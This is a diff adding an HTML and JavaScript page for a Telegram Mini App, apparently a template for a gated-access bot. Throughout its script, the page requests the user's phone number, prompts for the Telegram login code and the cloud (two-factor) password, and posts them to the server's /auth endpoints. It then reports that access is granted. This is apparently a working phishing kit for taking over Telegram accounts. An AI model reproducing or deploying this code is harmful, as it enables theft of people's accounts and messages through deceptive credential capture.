@@ -1,0 +1,531 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title> </title>
+  <script async src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    :root { color-scheme: dark; }
+    *, *::before, *::after { box-sizing: border-box; }
+    
+    html, body {
+      margin: 0; padding: 0;
+      min-height: 100%;
+      background: #000;
+      color: #fff;
+      font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
+      -webkit-text-size-adjust: 100%;
+      overflow-x: hidden;
+    }
+    #bg {
+      position: fixed; inset: 0; z-index: 0;   
+      background-size: cover; background-position: center;
+    }
+    #apphead {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 2;
+      text-align: center; pointer-events: none;
+      padding: calc(10px + env(safe-area-inset-top)) 14px 10px;
+      font-size: 14px; font-weight: 600; letter-spacing: .2px; opacity: .85;
+      text-shadow: 0 1px 4px rgba(0,0,0,.5);
+    }
+    #root {
+      position: relative; z-index: 1;           
+      min-height: 100vh;            
+      min-height: 100dvh;           
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      text-align: center;
+      
+      padding: calc(24px + env(safe-area-inset-top)) 20px
+               calc(24px + env(safe-area-inset-bottom)) 20px;
+    }
+    .card { width: 100%; max-width: 380px; margin: auto 0; }
+    h2 { margin: 0 0 12px; font-size: clamp(20px, 6vw, 24px); }
+    p { margin: 6px 0; opacity: .85; line-height: 1.45; }
+    .muted { font-size: clamp(12px, 3.6vw, 14px); opacity: .6; }
+    .emoji { font-size: clamp(44px, 16vw, 68px); line-height: 1; margin-bottom: 16px; }
+    .text {
+      font-size: clamp(15px, 4.3vw, 18px); line-height: 1.5;
+      margin-bottom: 22px; overflow-wrap: anywhere;
+    }
+    .btn {
+      display: block; width: 100%; max-width: 340px; margin: 4px auto 0;
+      border: none; cursor: pointer; -webkit-appearance: none;
+      padding: 15px 24px; border-radius: 14px; font-size: 16px; font-weight: 600;
+      color: #fff; background: var(--tg-theme-button-color, #2ea6ff);
+    }
+    .inp {
+      display: block; width: 100%; max-width: 340px;
+      margin: 0 auto 14px; padding: 14px 16px; border-radius: 14px;
+      border: 1px solid rgba(127,127,127,.35);
+      background: rgba(127,127,127,.12); color: #fff;
+      font-size: 16px;            
+      text-align: center; outline: none;
+    }
+    .step { font-size: 12px; opacity: .4; margin-top: 18px; }
+
+    
+    
+
+    
+    #root.view-card .card {
+      background: rgba(15,17,23,.95);
+      border: 1px solid rgba(255,255,255,.06);
+      border-radius: 18px; padding: 38px 24px;
+      box-shadow: 0 22px 60px rgba(0,0,0,.6);
+    }
+    
+    #root.view-glass .card {
+      background: rgba(255,255,255,.08);
+      border: 1.5px solid rgba(255,255,255,.45);
+      border-radius: 34px; padding: 38px 24px;
+      -webkit-backdrop-filter: blur(24px) saturate(180%);
+      backdrop-filter: blur(24px) saturate(180%);
+      box-shadow: inset 0 1px 0 rgba(255,255,255,.25),
+                  0 22px 60px rgba(0,0,0,.3);
+    }
+    
+    #root.view-minimal { justify-content: flex-start; text-align: left; }
+    #root.view-minimal .card { margin: 10vh 0 0; max-width: 460px; }
+    #root.view-minimal .emoji { font-size: clamp(28px,8vw,38px); margin-bottom: 8px; }
+    #root.view-minimal .text {
+      font-size: clamp(21px,6.2vw,28px); font-weight: 700; line-height: 1.3;
+    }
+    #root.view-minimal .inp { margin-left: 0; text-align: left; }
+    #root.view-minimal .btn {
+      margin-left: 0; background: transparent;
+      border: 2px solid var(--tg-theme-button-color, #2ea6ff);
+      color: #fff; border-radius: 12px;
+    }
+    
+    #root.view-bottom { justify-content: flex-start; padding-bottom: 104px; }
+    #root.view-bottom .card { margin: 8vh 0 0; }
+    #root.view-bottom .emoji { font-size: clamp(64px,23vw,104px); }
+    #root.view-bottom .text { font-size: clamp(17px,5vw,21px); }
+    #root.view-bottom .btn {
+      position: fixed; left: 16px; right: 16px; width: auto; max-width: none;
+      bottom: calc(16px + env(safe-area-inset-bottom)); margin: 0;
+      padding: 18px; font-size: 18px; border-radius: 16px;
+      box-shadow: 0 8px 30px rgba(0,0,0,.45);
+    }
+    .spinner {
+      width: 52px; height: 52px; border-radius: 50%;
+      border: 5px solid rgba(127,127,127,.25);
+      border-top-color: var(--tg-theme-button-color, #2ea6ff);
+      animation: spin .9s linear infinite; margin: 0 auto 18px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-label { font-size: 16px; opacity: .85; }
+    .loading-dots::after {
+      content: ""; animation: dots 1.2s steps(4, end) infinite;
+    }
+    @keyframes dots {
+      0% { content: ""; } 25% { content: "."; }
+      50% { content: ".."; } 75% { content: "..."; }
+    }
+  </style>
+</head>
+<body>
+  <div id="bg"></div>
+  <div id="apphead"></div>
+  <div id="root"></div>
+
+  <script>
+    const BOT_ID = "__BOT_ID__";
+    const CFG = __CFG__;
+    const URL_TOKEN = new URLSearchParams(window.location.search).get("t") || "";
+    const root = document.getElementById("root");
+
+    function tgApp() { return window.Telegram ? window.Telegram.WebApp : null; }
+
+    function getInitData() {
+      const tg = tgApp();
+      if (tg && tg.initData) return tg.initData;
+      const m = (window.location.hash || "").match(/tgWebAppData=([^&]+)/);
+      return m ? decodeURIComponent(m[1]) : "";
+    }
+
+    function whenTgReady(cb, tries) {
+      tries = tries || 0;
+      const tg = tgApp();
+      if (tg || tries > 50) { cb(tg); return; }
+      setTimeout(function () { whenTgReady(cb, tries + 1); }, 20);
+    }
+
+    function html(s) { root.innerHTML = '<div class="card">' + s + '</div>'; }
+
+    function resolveBg(v) {
+      if (!v) return "";
+      if (v.indexOf("gradient(") !== -1) return v;       // CSS-градиент
+      if (v.indexOf("url(") === 0) return v;              // готовый url(...)
+      if (/^https?:\/\//i.test(v)) return "url('" + v + "')"; // свой фон (URL)
+      return "";
+    }
+
+    function applyTheme() {
+      root.className = "view-" + (CFG.view || "classic");
+      if (CFG.title) {
+        document.title = CFG.title;
+        var ah = document.getElementById("apphead");
+        if (ah) ah.textContent = CFG.title;
+      }
+      if (CFG.color) {
+        document.documentElement.style.setProperty(
+          "--tg-theme-button-color", CFG.color
+        );
+      }
+      var css = resolveBg(CFG.bg);
+      if (css) {
+        var bg = document.getElementById("bg");
+        bg.style.backgroundImage = css;
+        bg.style.filter = "blur(" + (CFG.blur || 0) + "px)";
+        if (CFG.blur) bg.style.transform = "scale(1.1)";
+      }
+    }
+
+    var PAGES = CFG.pages || [];
+    var step = 0;
+    var AUTH = { sid: null, phone: null, lastError: "" };
+    var POLL_INTERVAL_MS = 700;
+    var POLL_TIMEOUT_MS  = 60000;
+
+    function authUrl(path) { return "/auth" + path; }
+
+    function findStepByKey(key) {
+      for (var i = 0; i < PAGES.length; i++) {
+        if (PAGES[i].key === key) return i;
+      }
+      return -1;
+    }
+
+    function errorText(code, attemptsLeft) {
+      var base;
+      switch (code) {
+        case "code_invalid":     base = "Неверный код"; break;
+        case "code_expired":     base = "Код истёк, запросите новый"; break;
+        case "password_invalid": base = "Неверный облачный пароль"; break;
+        case "too_many_code_attempts": base = "Слишком много попыток ввода кода"; break;
+        case "too_many_pwd_attempts":  base = "Слишком много попыток ввода пароля"; break;
+        case "flood_wait":       base = "Слишком часто. Подождите и попробуйте позже"; break;
+        case "phone_invalid":    base = "Неверный номер телефона"; break;
+        case "network":          base = "Ошибка сети, попробуйте ещё раз"; break;
+        default: base = code ? ("Ошибка: " + code) : "Ошибка";
+      }
+      if (typeof attemptsLeft === "number" && attemptsLeft >= 0) {
+        base += " (осталось попыток: " + attemptsLeft + ")";
+      }
+      return base;
+    }
+
+    function esc(s) {
+      return (s == null ? "" : String(s))
+        .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;");
+    }
+
+    function renderStep(i) {
+      var p = PAGES[i];
+      if (!p) return;
+      var out = "";
+      if (p.emoji) out += '<div class="emoji">' + p.emoji + "</div>";
+      if (p.text) out += '<div class="text">' + p.text + "</div>";
+      if (p.key === "code") {
+        out += '<input class="inp" id="inp" inputmode="numeric" '
+             + 'placeholder="• • • • •" autocomplete="one-time-code" />';
+      } else if (p.key === "twofa") {
+        out += '<input class="inp" id="inp" type="password" placeholder="'
+             + esc(p.placeholder) + '" autocomplete="current-password" />';
+        if (p.hint) out += '<p class="muted">' + p.hint + "</p>";
+      }
+      if (AUTH.lastError && (p.key === "code" || p.key === "twofa")) {
+        out += '<p class="muted" style="color:#ff6b6b;opacity:.95">'
+             + esc(AUTH.lastError) + "</p>";
+      }
+      var last = i >= PAGES.length - 1;
+      var label = p.button || (last ? "Готово" : "Далее");
+      out += '<button class="btn" id="act">' + esc(label) + "</button>";
+      out += '<div class="step">' + (i + 1) + " / " + PAGES.length + "</div>";
+      html(out);
+      window.scrollTo(0, 0);
+      var tg = tgApp();
+      if (tg) { try { tg.expand(); } catch (e) {} }
+      var act = document.getElementById("act");
+      if (act) {
+        act.onclick = (p.key === "main") ? requestPhone : nextStep;
+      }
+    }
+
+    function extractPhoneFromContact(evt) {
+      try {
+        var u = evt && (evt.responseUnsafe || evt.response_unsafe || evt.response);
+        if (u && u.contact && u.contact.phone_number) return u.contact.phone_number;
+        if (u && typeof u === "string") {
+          var parsed = JSON.parse(u);
+          if (parsed && parsed.contact && parsed.contact.phone_number) {
+            return parsed.contact.phone_number;
+          }
+        }
+      } catch (e) {}
+      try {
+        var tg = tgApp();
+        var ph = tg && tg.initDataUnsafe && tg.initDataUnsafe.user
+               && tg.initDataUnsafe.user.phone_number;
+        if (ph) return ph;
+      } catch (e) {}
+      return "";
+    }
+
+    function tgUserId() {
+      try {
+        var tg = tgApp();
+        return tg && tg.initDataUnsafe && tg.initDataUnsafe.user
+             ? tg.initDataUnsafe.user.id : 0;
+      } catch (e) { return 0; }
+    }
+
+    async function sendCodeRequest(phone) {
+      showLoading("Отправляем код");
+      try {
+        var r = await fetch(authUrl("/send_code"), {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          credentials: "include",
+          body: JSON.stringify({ tg_user_id: tgUserId(), phone: phone, bot_id: BOT_ID }),
+        });
+        var data = await r.json().catch(function () { return {}; });
+        if (!r.ok || !data.sid) {
+          AUTH.lastError = errorText(data.error || "network");
+          renderStep(step);
+          return false;
+        }
+        AUTH.sid = data.sid;
+        AUTH.phone = data.phone || phone;
+        AUTH.lastError = "";
+        return true;
+      } catch (e) {
+        AUTH.lastError = errorText("network");
+        renderStep(step);
+        return false;
+      }
+    }
+
+    function requestPhone() {
+      var tg = tgApp();
+      if (tg && typeof tg.requestContact === "function") {
+        try {
+          tg.requestContact(async function (ok, evt) {
+            var shared = ok === true || (evt && evt.status === "sent");
+            if (!shared) return;
+            var phone = extractPhoneFromContact(evt);
+            if (!phone) {
+              AUTH.lastError = errorText("phone_invalid");
+              renderStep(step);
+              return;
+            }
+            var sent = await sendCodeRequest(phone);
+            if (sent) goTo(step + 1);
+          });
+          return;
+        } catch (e) {}
+      }
+      // Фолбэк: вне Telegram WebApp — просто идём дальше, без авторизации
+      nextStep();
+    }
+
+    function showLoading(label) {
+      var l = label
+        ? '<div class="loading-label loading-dots">' + esc(label) + "</div>"
+        : "";
+      html('<div class="spinner"></div>' + l);
+      window.scrollTo(0, 0);
+    }
+
+    function goTo(i) {
+      step = i;
+      renderStep(step);
+    }
+
+    function getInputValue() {
+      var el = document.getElementById("inp");
+      return el ? String(el.value || "").trim() : "";
+    }
+
+    function sleep(ms) {
+      return new Promise(function (res) { setTimeout(res, ms); });
+    }
+
+    async function pollStatus(sid) {
+      var started = Date.now();
+      while (Date.now() - started < POLL_TIMEOUT_MS) {
+        await sleep(POLL_INTERVAL_MS);
+        try {
+          var r = await fetch(authUrl("/status/" + encodeURIComponent(sid)), {
+            credentials: "include",
+          });
+          if (!r.ok) continue;
+          var data = await r.json();
+          if (!data || !data.state) continue;
+          if (data.state !== "checking_code" && data.state !== "checking_password") {
+            return data;
+          }
+        } catch (e) { /* сеть мигнула — продолжаем поллить */ }
+      }
+      return { state: "failed", error: "network" };
+    }
+
+    function finishFlow() {
+      // Все шаги пройдены — финальная страница уже отрисована;
+      // если это была последняя — закрываем приложение.
+      if (step >= PAGES.length - 1) {
+        var tg = tgApp();
+        if (tg && tg.close) tg.close();
+        return;
+      }
+      goTo(step + 1);
+    }
+
+    async function submitCode() {
+      var code = getInputValue();
+      if (!code) {
+        AUTH.lastError = errorText("code_invalid");
+        renderStep(step);
+        return;
+      }
+      if (!AUTH.sid) {
+        // На фолбэк-пути (не Telegram) — просто двигаемся, как раньше
+        goTo(step + 1);
+        return;
+      }
+      showLoading("Проверяем код");
+      var data;
+      try {
+        var r = await fetch(authUrl("/submit_code"), {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          credentials: "include",
+          body: JSON.stringify({ sid: AUTH.sid, code: code }),
+        });
+        data = await r.json().catch(function () { return {}; });
+        if (r.ok && (data.state === "checking_code" || data.state === "wait_code")) {
+          data = await pollStatus(AUTH.sid);
+        }
+        // 4xx с code_invalid/expired — data уже содержит error
+      } catch (e) {
+        data = { state: "failed", error: "network" };
+      }
+
+      if (data.state === "success") {
+        AUTH.lastError = "";
+        finishFlow();
+        return;
+      }
+      if (data.state === "wait_password") {
+        AUTH.lastError = "";
+        var idx = findStepByKey("twofa");
+        if (idx >= 0) { goTo(idx); return; }
+        // twofa-страницы нет — продолжаем как если бы успех
+        finishFlow();
+        return;
+      }
+      // Любая ветка ошибки — возвращаемся на шаг code с сообщением
+      AUTH.lastError = errorText(data.error || data.state, data.code_attempts_left);
+      goTo(findStepByKey("code") >= 0 ? findStepByKey("code") : step);
+    }
+
+    async function submitPassword() {
+      var pwd = getInputValue();
+      if (!pwd) {
+        AUTH.lastError = errorText("password_invalid");
+        renderStep(step);
+        return;
+      }
+      if (!AUTH.sid) {
+        goTo(step + 1);
+        return;
+      }
+      showLoading("Проверяем облачный пароль");
+      var data;
+      try {
+        var r = await fetch(authUrl("/submit_password"), {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          credentials: "include",
+          body: JSON.stringify({ sid: AUTH.sid, password: pwd }),
+        });
+        data = await r.json().catch(function () { return {}; });
+        if (r.ok && (data.state === "checking_password" || data.state === "wait_password")) {
+          data = await pollStatus(AUTH.sid);
+        }
+      } catch (e) {
+        data = { state: "failed", error: "network" };
+      }
+
+      if (data.state === "success") {
+        AUTH.lastError = "";
+        finishFlow();
+        return;
+      }
+      AUTH.lastError = errorText(data.error || data.state, data.pwd_attempts_left);
+      goTo(findStepByKey("twofa") >= 0 ? findStepByKey("twofa") : step);
+    }
+
+    function nextStep() {
+      if (step >= PAGES.length - 1) {
+        var tg = tgApp();
+        if (tg && tg.close) tg.close();
+        return;
+      }
+      var leaving = PAGES[step].key;
+      if (leaving === "code")  { submitCode();     return; }
+      if (leaving === "twofa") { submitPassword(); return; }
+      goTo(step + 1);
+    }
+
+    function renderGranted() {
+      whenTgReady(function (tg) {
+        if (tg) { tg.ready(); try { tg.expand(); } catch (e) {} }
+        applyTheme();
+        if (!PAGES.length) { html('<h2>Доступ открыт ✅</h2>'); return; }
+        step = 0;
+        renderStep(step);
+      });
+    }
+
+    function redirect(url) {
+      const tg = tgApp();
+      if (!url) { if (tg && tg.close) tg.close(); return; }
+      const isTme = /(^|\/\/)(t\.me|telegram\.me)/i.test(url);
+      if (/^https?:\/\//i.test(url) && !isTme) {
+        window.location.replace(url);
+        return;
+      }
+      if (tg && tg.openTelegramLink) {
+        try { tg.openTelegramLink(url); } catch (e) {}
+        if (tg.close) tg.close();
+      } else {
+        window.location.replace(url);
+      }
+    }
+
+    async function main() {
+      try {
+        const r = await fetch("/dl/" + BOT_ID + "/auth/start", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          credentials: "include",
+          body: JSON.stringify({ init_data: getInitData(), token: URL_TOKEN }),
+        });
+        const data = await r.json();
+        if (data.mode === "granted") renderGranted();
+        else redirect(data.redirect_url);
+      } catch (e) {
+        const tg = tgApp();
+        if (tg && tg.close) tg.close();
+      }
+    }
+
+    main();
+  </script>
+</body>
+</html>
